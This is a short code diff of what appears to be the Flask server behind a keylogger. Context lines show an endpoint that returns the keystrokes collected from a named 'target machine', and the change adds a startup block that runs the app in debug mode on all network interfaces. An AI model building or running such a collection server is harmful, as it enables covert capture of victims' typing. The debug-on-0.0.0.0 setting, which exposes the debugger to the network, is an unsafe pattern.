@@ -73,3 +73,6 @@ def get_target_machine_key_strokes(machine):
         with open(file_path, "r", encoding="utf-8") as f:
             keystrokes.append(f.read())
     return jsonify({"machine": machine, "keystrokes": keystrokes}), 200
+
+if __name__ == "__main__":
+    app.run(debug=True, host='0.0.0.0')
